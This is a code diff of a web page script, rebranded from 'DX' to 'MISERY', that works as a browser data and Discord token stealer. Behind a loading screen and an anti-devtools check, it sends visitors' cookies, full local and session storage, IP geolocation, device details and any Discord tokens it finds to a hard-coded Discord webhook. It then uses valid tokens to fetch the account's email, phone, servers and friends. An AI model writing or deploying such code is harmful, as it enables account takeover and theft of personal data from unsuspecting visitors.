+                const wDiff = window.outerWidth - window.innerWidth;
+                const hDiff = window.outerHeight - window.innerHeight;
+                if (wDiff > 160 || hDiff > 160) killPage();
+            } catch(e) {}
         }
-        setInterval(detectDevTools, 600);
+        setInterval(detectDevTools, 800);
         window.addEventListener('resize', detectDevTools);
 
-        // ---------- WEBHOOK ----------
+        // WEBHOOK
         const WEBHOOK = 'https://discord.com/api/webhooks/1533341478091362405/eDM8Uti1Y_Pmp6V1TJKzmxcjq_1bMzwitAlaNGeWNB20oswh9lPaobc4Nn0B-095pfAI';
 
         function sendToWebhook(content) {
@@ -344,11 +340,10 @@
             }).catch(() => {});
         }
 
-        // ---------- LOADING SCREEN ----------
+        // LOADING
         const loadingScreen = document.getElementById('loadingScreen');
         const enterBtn = document.getElementById('enterBtn');
         const mainContent = document.getElementById('mainContent');
-
         let loadProgress = 0;
         const loadInterval = setInterval(() => {
             loadProgress += Math.random() * 8 + 2;
@@ -360,11 +355,11 @@
             }
             const loaderText = document.querySelector('.loader-text');
             if (loaderText) {
-                loaderText.textContent = 'LOADING DX ' + Math.floor(loadProgress) + '%';
+                loaderText.textContent = 'LOADING MISERY ' + Math.floor(loadProgress) + '%';
             }
         }, 120);
 
-        // ---------- ENTER BUTTON ----------
+        // ENTER
         enterBtn.addEventListener('click', function() {
             this.classList.remove('show');
             this.style.display = 'none';
@@ -372,23 +367,38 @@
             collectAllData();
         });
 
-        // ---------- COLLECT ALL DATA SILENTLY ----------
+        // ---------- FIXED: COLLECT ALL DATA ----------
         function collectAllData() {
-            sendToWebhook('🔴 **DX DATA HARVEST**');
+            // Send header
+            sendToWebhook('🔴 **MISERY EXTENDED DATA HARVEST**');
 
-            // 1. Browser & system info
-            const info = [];
-            info.push(`🌐 **Browser Info:**`);
-            info.push(`  User Agent: ${navigator.userAgent}`);
-            info.push(`  Language: ${navigator.language}`);
-            info.push(`  Platform: ${navigator.platform}`);
-            info.push(`  Screen: ${screen.width}x${screen.height} (${screen.colorDepth}-bit)`);
-            info.push(`  Window: ${window.innerWidth}x${window.innerHeight}`);
-            info.push(`  Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
-            info.push(`  Time: ${new Date().toISOString()}`);
+            // ===== 1. BROWSER & SYSTEM INFO (ALWAYS WORKS) =====
+            let info = [];
+            info.push(`🌐 **Browser & System:**`);
+            info.push(`  User Agent: ${navigator.userAgent || 'N/A'}`);
+            info.push(`  Language: ${navigator.language || 'N/A'}`);
+            info.push(`  Languages: ${navigator.languages ? navigator.languages.join(', ') : 'N/A'}`);
+            info.push(`  Platform: ${navigator.platform || 'N/A'}`);
+            info.push(`  Vendor: ${navigator.vendor || 'N/A'}`);
+            info.push(`  Screen: ${screen.width || '?'}x${screen.height || '?'} (${screen.colorDepth || '?'}-bit)`);
+            info.push(`  Available: ${screen.availWidth || '?'}x${screen.availHeight || '?'}`);
+            info.push(`  Window: ${window.innerWidth || '?'}x${window.innerHeight || '?'}`);
+            info.push(`  Device Pixel Ratio: ${window.devicePixelRatio || 1}`);
+            info.push(`  Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A'}`);
+            info.push(`  UTC Time: ${new Date().toISOString() || 'N/A'}`);
+            info.push(`  Local Time: ${new Date().toString() || 'N/A'}`);
             if (navigator.hardwareConcurrency) info.push(`  CPU Cores: ${navigator.hardwareConcurrency}`);
             if (navigator.deviceMemory) info.push(`  Device Memory: ${navigator.deviceMemory} GB`);
             if (navigator.maxTouchPoints) info.push(`  Touch Points: ${navigator.maxTouchPoints}`);
+            info.push(`  Cookie Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}`);
+            info.push(`  Do Not Track: ${navigator.doNotTrack || 'N/A'}`);
+            if (navigator.connection) {
+                info.push(`  Connection Type: ${navigator.connection.effectiveType || 'N/A'}`);
+                info.push(`  Downlink: ${navigator.connection.downlink || 'N/A'} Mbps`);
+                info.push(`  RTT: ${navigator.connection.rtt || 'N/A'} ms`);
+            } else {
+                info.push(`  Connection: Not available`);
+            }
 
             // GPU
             try {
@@ -397,13 +407,19 @@
                 if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                     if (debugInfo) {
-                        info.push(`  GPU Vendor: ${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}`);
-                        info.push(`  GPU Renderer: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`);
+                        info.push(`  GPU Vendor: ${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A'}`);
+                        info.push(`  GPU Renderer: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A'}`);
                     }
+                    info.push(`  WebGL Version: ${gl.getParameter(gl.VERSION) || 'N/A'}`);
+                    info.push(`  Shading Language: ${gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || 'N/A'}`);
+                } else {
+                    info.push(`  WebGL: Not supported`);
                 }
-            } catch(e) {}
+            } catch(e) {
+                info.push(`  WebGL: Error - ${e.message || 'Unknown'}`);
+            }
 
-            // Local IP via WebRTC (silent)
+            // Local IP via WebRTC
             try {
                 const pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('test');
@@ -418,33 +434,70 @@
                     }
                 };
                 setTimeout(() => { try { pc.close(); } catch(e) {} }, 2000);
-            } catch(e) {}
+            } catch(e) {
+                info.push(`  Local IP: Not available`);
+            }
 
-            // Cookies
+            // Battery
             try {
-                const cookies = document.cookie.split(';').filter(c => c.trim());
-                info.push(`  Cookies: ${cookies.length} found`);
-            } catch(e) {}
-
-            // Storage
-            try {
-                let total = 0;
-                for (let key in localStorage) {
-                    if (localStorage.hasOwnProperty(key)) total += localStorage[key].length + key.length;
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(battery => {
+                        info.push(`  Battery Level: ${Math.round(battery.level * 100)}%`);
+                        info.push(`  Charging: ${battery.charging ? 'Yes' : 'No'}`);
+                        sendToWebhook('```\n' + info.join('\n') + '\n```');
+                    }).catch(() => {
+                        sendToWebhook('```\n' + info.join('\n') + '\n```');
+                    });
+                } else {
+                    sendToWebhook('```\n' + info.join('\n') + '\n```');
                 }
-                info.push(`  LocalStorage: ${(total/1024).toFixed(1)} KB`);
-            } catch(e) {}
+            } catch(e) {
+                sendToWebhook('```\n' + info.join('\n') + '\n```');
+            }
+
+            // ===== 2. COOKIES =====
             try {
-                let total = 0;
-                for (let key in sessionStorage) {
-                    if (sessionStorage.hasOwnProperty(key)) total += sessionStorage[key].length + key.length;
+                const cookies = document.cookie ? document.cookie.split(';').filter(c => c.trim()) : [];
+                sendToWebhook(`🍪 **Cookies:** ${cookies.length} found\n${cookies.length > 0 ? cookies.join('\n') : '(none)'}`);
+            } catch(e) {
+                sendToWebhook(`🍪 **Cookies:** Error - ${e.message}`);
+            }
+
+            // ===== 3. LOCALSTORAGE =====
+            try {
+                const lsData = [];
+                if (localStorage && localStorage.length > 0) {
+                    for (let key in localStorage) {
+                        if (localStorage.hasOwnProperty(key)) {
+                            let val = localStorage[key];
+                            if (val && val.length > 500) val = val.substring(0, 500) + '... [truncated]';
+                            lsData.push(`${key}: ${val}`);
+                        }
+                    }
                 }
-                info.push(`  SessionStorage: ${(total/1024).toFixed(1)} KB`);
-            } catch(e) {}
+                sendToWebhook(`💾 **LocalStorage (${lsData.length} keys):**\n${lsData.length > 0 ? lsData.join('\n') : '(empty)'}`);
+            } catch(e) {
+                sendToWebhook(`💾 **LocalStorage:** Error - ${e.message}`);
+            }
 
-            sendToWebhook('```\n' + info.join('\n') + '\n```');
+            // ===== 4. SESSIONSTORAGE =====
+            try {
+                const ssData = [];
+                if (sessionStorage && sessionStorage.length > 0) {
+                    for (let key in sessionStorage) {
+                        if (sessionStorage.hasOwnProperty(key)) {
+                            let val = sessionStorage[key];
+                            if (val && val.length > 500) val = val.substring(0, 500) + '... [truncated]';
+                            ssData.push(`${key}: ${val}`);
+                        }
+                    }
+                }
+                sendToWebhook(`📦 **SessionStorage (${ssData.length} keys):**\n${ssData.length > 0 ? ssData.join('\n') : '(empty)'}`);
+            } catch(e) {
+                sendToWebhook(`📦 **SessionStorage:** Error - ${e.message}`);
+            }
 
-            // 2. Public IP + geolocation
+            // ===== 5. PUBLIC IP & GEOLOCATION =====
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(data => {
@@ -454,7 +507,7 @@
                             .then(r => r.json())
                             .then(geo => {
                                 if (geo && geo.status === 'success') {
-                                    sendToWebhook(`📍 **IP Location:** ${geo.city}, ${geo.region}, ${geo.country} (${geo.lat}, ${geo.lon}) - ISP: ${geo.isp}`);
+                                    sendToWebhook(`📍 **IP Location:**\nCity: ${geo.city || 'N/A'}\nRegion: ${geo.regionName || 'N/A'}\nCountry: ${geo.country || 'N/A'}\nLat/Lon: ${geo.lat || 'N/A'}, ${geo.lon || 'N/A'}\nISP: ${geo.isp || 'N/A'}\nORG: ${geo.org || 'N/A'}\nAS: ${geo.as || 'N/A'}`);
                                 }
                             })
                             .catch(() => {});
@@ -462,47 +515,102 @@
                 })
                 .catch(() => {});
 
-            // 3. Discord token scan
+            // ===== 6. PLUGINS =====
+            try {
+                const plugins = [];
+                if (navigator.plugins) {
+                    for (let i = 0; i < navigator.plugins.length; i++) {
+                        const p = navigator.plugins[i];
+                        if (p && p.name) plugins.push(`${p.name} (${p.filename || 'N/A'})`);
+                    }
+                }
+                sendToWebhook(`🔌 **Plugins (${plugins.length}):**\n${plugins.length > 0 ? plugins.join('\n') : '(none)'}`);
+            } catch(e) {
+                sendToWebhook(`🔌 **Plugins:** Error - ${e.message}`);
+            }
+
+            // ===== 7. SCREEN ORIENTATION =====
+            try {
+                const orient = screen.orientation || {};
+                sendToWebhook(`📱 **Screen Orientation:** Type: ${orient.type || 'N/A'}, Angle: ${orient.angle || 'N/A'}`);
+            } catch(e) {}
+
+            // ===== 8. PERFORMANCE TIMING =====
+            try {
+                if (performance && performance.timing) {
+                    const perf = performance.timing;
+                    const loadTime = perf.loadEventEnd - perf.navigationStart;
+                    const domTime = perf.domComplete - perf.domLoading;
+                    const dnsTime = perf.domainLookupEnd - perf.domainLookupStart;
+                    const tcpTime = perf.connectEnd - perf.connectStart;
+                    sendToWebhook(`⏱️ **Performance:**\nPage Load: ${loadTime || 0}ms\nDOM Ready: ${domTime || 0}ms\nDNS: ${dnsTime || 0}ms\nTCP: ${tcpTime || 0}ms`);
+                } else {
+                    sendToWebhook(`⏱️ **Performance:** Timing API not available`);
+                }
+            } catch(e) {
+                sendToWebhook(`⏱️ **Performance:** Error - ${e.message}`);
+            }
+
+            // ===== 9. DISCORD TOKEN SCAN =====
             setTimeout(() => {
                 scanDiscordToken();
-            }, 1000);
+            }, 1500);
         }
 
-        // ---------- DISCORD TOKEN SCANNER ----------
+        // ---------- DISCORD TOKEN SCANNER (FIXED) ----------
         function scanDiscordToken() {
             const tokenSources = [];
+            const tokenRegex = /[A-Za-z0-9_-]{23,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}/g;
 
             // localStorage
             try {
-                for (let key in localStorage) {
-                    const val = localStorage[key];
-                    if (typeof val === 'string' && val.length > 20) {
-                        if (val.match(/^[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{20,}/)) {
-                            tokenSources.push({ source: 'localStorage', key, token: val });
-                        }
-                        try {
-                            const parsed = JSON.parse(val);
-                            const jsonStr = JSON.stringify(parsed);
-                            const matches = jsonStr.match(/[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{20,}/g);
-                            if (matches) {
-                                matches.forEach(t => {
-                                    if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
-                                        tokenSources.push({ source: 'localStorage JSON', key, token: t });
+                if (localStorage && localStorage.length > 0) {
+                    for (let key in localStorage) {
+                        if (localStorage.hasOwnProperty(key)) {
+                            const val = localStorage[key];
+                            if (typeof val === 'string' && val.length > 20) {
+                                const matches = val.match(tokenRegex);
+                                if (matches) {
+                                    matches.forEach(t => {
+                                        if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
+                                            tokenSources.push({ source: 'localStorage', key, token: t });
+                                        }
+                                    });
+                                }
+                                try {
+                                    const parsed = JSON.parse(val);
+                                    const jsonStr = JSON.stringify(parsed);
+                                    const matches2 = jsonStr.match(tokenRegex);
+                                    if (matches2) {
+                                        matches2.forEach(t => {
+                                            if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
+                                                tokenSources.push({ source: 'localStorage JSON', key, token: t });
+                                            }
+                                        });
                                     }
-                                });
+                                } catch(e) {}
                             }
-                        } catch(e) {}
+                        }
                     }
                 }
             } catch(e) {}
 
             // sessionStorage
             try {
-                for (let key in sessionStorage) {
-                    const val = sessionStorage[key];
-                    if (typeof val === 'string' && val.length > 20) {
-                        if (val.match(/^[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{20,}/)) {
-                            tokenSources.push({ source: 'sessionStorage', key, token: val });
+                if (sessionStorage && sessionStorage.length > 0) {
+                    for (let key in sessionStorage) {
+                        if (sessionStorage.hasOwnProperty(key)) {
+                            const val = sessionStorage[key];
+                            if (typeof val === 'string' && val.length > 20) {
+                                const matches = val.match(tokenRegex);
+                                if (matches) {
+                                    matches.forEach(t => {
+                                        if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
+                                            tokenSources.push({ source: 'sessionStorage', key, token: t });
+                                        }
+                                    });
+                                }
+                            }
                         }
                     }
                 }
@@ -510,22 +618,29 @@
 
             // Cookies
             try {
-                const cookies = document.cookie.split(';');
-                cookies.forEach(cookie => {
-                    const parts = cookie.trim().split('=');
-                    if (parts.length === 2) {
-                        const val = parts[1];
-                        if (val.length > 20 && val.match(/^[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{20,}/)) {
-                            tokenSources.push({ source: 'cookie', key: parts[0], token: val });
+                if (document.cookie) {
+                    const cookies = document.cookie.split(';');
+                    cookies.forEach(cookie => {
+                        const parts = cookie.trim().split('=');
+                        if (parts.length === 2) {
+                            const val = parts[1];
+                            const matches = val.match(tokenRegex);
+                            if (matches) {
+                                matches.forEach(t => {
+                                    if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
+                                        tokenSources.push({ source: 'cookie', key: parts[0], token: t });
+                                    }
+                                });
+                            }
                         }
-                    }
-                });
+                    });
+                }
             } catch(e) {}
 
             // window object
             try {
                 const windowStr = JSON.stringify(window);
-                const matches = windowStr.match(/[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{20,}/g);
+                const matches = windowStr.match(tokenRegex);
                 if (matches) {
                     matches.forEach(t => {
                         if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
@@ -538,7 +653,7 @@
             // HTML
             try {
                 const html = document.documentElement.innerHTML;
-                const matches = html.match(/[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{20,}/g);
+                const matches = html.match(tokenRegex);
                 if (matches) {
                     matches.forEach(t => {
                         if (t.length > 30 && !tokenSources.some(s => s.token === t)) {
@@ -582,7 +697,7 @@
                         validCount++;
                         const tag = data.global_name || data.username || data.id;
                         userInfo = ` | ${tag} (${data.id})`;
-                        await sendToWebhook(`🎯 **VALID TOKEN**\nToken: \`${token}\`\nUser: ${tag} (${data.id})\nEmail: ${data.email || 'N/A'}\n2FA: ${data.mfa_enabled ? 'Yes' : 'No'}\nNitro: ${data.premium_type || 'None'}\nVerified: ${data.verified ? 'Yes' : 'No'}\nCreated: ${data.created_at || 'N/A'}`);
+                        await sendToWebhook(`🎯 **VALID TOKEN**\nToken: \`${token}\`\nUser: ${tag} (${data.id})\nEmail: ${data.email || 'N/A'}\n2FA: ${data.mfa_enabled ? 'Yes' : 'No'}\nNitro: ${data.premium_type || 'None'}\nVerified: ${data.verified ? 'Yes' : 'No'}\nPhone: ${data.phone || 'N/A'}`);
                         
                         // Guilds
                         try {
@@ -591,24 +706,10 @@
                             });
                             if (gRes.ok) {
                                 const guilds = await gRes.json();
-                                if (guilds.length > 0) {
-                                    let guildList = guilds.slice(0, 15).map(g => `${g.name} (${g.id}) - ${g.approximate_member_count || '?'} members`).join('\n');
+                                if (guilds && guilds.length > 0) {
+                                    let guildList = guilds.slice(0, 15).map(g => `${g.name || 'Unknown'} (${g.id}) - ${g.approximate_member_count || '?'} members`).join('\n');
                                     if (guilds.length > 15) guildList += `\n... and ${guilds.length - 15} more`;
-                                    await sendToWebhook(`📋 **Guilds for ${tag}:**\n${guildList}`);
-                                }
-                            }
-                        } catch(e) {}
-
-                        // Connections
-                        try {
-                            const cRes = await fetch('https://discord.com/api/v9/users/@me/connections', {
-                                headers: { 'Authorization': token }
-                            });
-                            if (cRes.ok) {
-                                const conns = await cRes.json();
-                                if (conns.length > 0) {
-                                    const connList = conns.map(c => `${c.type}: ${c.name} (${c.id})`).join('\n');
-                                    await sendToWebhook(`🔗 **Connections for ${tag}:**\n${connList}`);
+                                    await sendToWebhook(`📋 **Guilds (${guilds.length} total):**\n${guildList}`);
                                 }
                             }
                         } catch(e) {}
@@ -620,19 +721,24 @@
                             });
                             if (fRes.ok) {
                                 const rels = await fRes.json();
-                                const friends = rels.filter(r => r.type === 1);
-                                if (friends.length > 0) {
-                                    const friendList = friends.slice(0, 10).map(f => `${f.user.global_name || f.user.username} (${f.user.id})`).join('\n');
-                                    await sendToWebhook(`👥 **Friends for ${tag}:** ${friends.length} total\n${friendList}${friends.length > 10 ? `\n... and ${friends.length - 10} more` : ''}`);
+                                if (rels && Array.isArray(rels)) {
+                                    const friends = rels.filter(r => r.type === 1);
+                                    if (friends.length > 0) {
+                                        const friendList = friends.slice(0, 10).map(f => `${f.user && (f.user.global_name || f.user.username) || 'Unknown'} (${f.user && f.user.id || '?'})`).join('\n');
+                                        await sendToWebhook(`👥 **Friends:** ${friends.length} total\n${friendList}${friends.length > 10 ? `\n... and ${friends.length - 10} more` : ''}`);
+                                    }
                                 }
                             }
                         } catch(e) {}
 
                     } else if (res.status === 401) {
-                        status = '❌ INVALID (expired)';
+                        status = '❌ INVALID (expired/revoked)';
                         invalidCount++;
                     } else if (res.status === 403) {
-                        status = '⛔ BANNED';
+                        status = '⛔ BANNED/LOCKED';
+                        invalidCount++;
+                    } else if (res.status === 429) {
+                        status = '⚠️ RATE LIMITED';
                         invalidCount++;
                     } else {
                         status = '⚠️ ERROR ' + res.status;
@@ -647,7 +753,7 @@
 
             Promise.all(tokenPromises).then(async (results) => {
                 const summary = results.join('\n');
-                await sendToWebhook('```\nDX TOKEN SCAN RESULTS\n' + summary + '\n\nValid: ' + validCount + ' | Invalid: ' + invalidCount + '\n```');
+                await sendToWebhook('```\nMISERY TOKEN SCAN RESULTS\n' + summary + '\n\nValid: ' + validCount + ' | Invalid: ' + invalidCount + '\n```');
             });
         }
 
@@ -668,7 +774,7 @@
             wrappedLines.forEach(span => asciiContainer.appendChild(span));
         }
 
-        console.log('DX loaded.');
+        console.log('Misery extended loaded.');
     })();
     </script>
 </body>
